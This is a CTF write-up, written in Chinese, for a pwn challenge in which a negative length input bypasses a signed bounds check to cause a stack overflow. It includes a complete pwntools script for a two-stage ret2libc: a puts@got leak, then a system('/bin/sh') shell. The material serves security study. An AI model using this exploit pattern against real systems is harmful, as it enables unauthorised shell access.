# week1pwn5

## 题目简述

程序先读取用户给出的长度，再把数据写入 `0x50` 字节栈缓冲区。长度检查存在有符号数问题，输入 `-1` 可绕过上限检查并触发溢出；由于 NX 开启，需要分两阶段完成 ret2libc。

## 解题过程

第一阶段用 `puts(puts@got)` 泄漏 libc 中 `puts` 的实际地址，然后返回 `0x40121f` 重新进入输入流程。由配套 libc 计算基址、`system` 和 `/bin/sh` 地址后，第二阶段调用 `system("/bin/sh")`：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
s = remote('HOST', PORT)
elf = ELF('./pwn5')
libc = ELF('./libc-2.31.so')

s.sendlineafter(b'this time,you want to read how many words?\n', b'-1')
payload = (
    b'a' * 0x50 + b'b' * 0x8 +
    p64(0x00000000004012f3) +
    p64(elf.got['puts']) +
    p64(elf.plt['puts']) +
    p64(0x40121F)
)
s.sendline(payload)

libc_base = u64(s.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search(b'/bin/sh').__next__()

s.sendlineafter(b'this time,you want to read how many words?\n', b'-1')
payload = (
    b'a' * 0x50 + b'b' * 0x8 +
    p64(0x000000000040101a) +
    p64(0x00000000004012f3) +
    p64(binsh) +
    p64(system)
)
s.sendline(payload)
s.interactive()
~~~

两次 payload 的返回地址偏移均为 `0x50 + 0x8 = 0x58`。第二阶段链首的单独 `ret` 用于栈对齐。

## 方法总结

- 核心方法：用负数绕过长度检查获得栈溢出，先泄漏 libc，再调用 `system("/bin/sh")`。
- 识别特征：长度变量按有符号数比较，却被传给接受无符号长度的读函数；程序有可重复进入的输入点和可用 GOT/PLT。
- 注意事项：必须使用远程匹配的 libc；泄漏不足 8 字节时需按小端补零，并在第二阶段关注 AMD64 栈对齐。
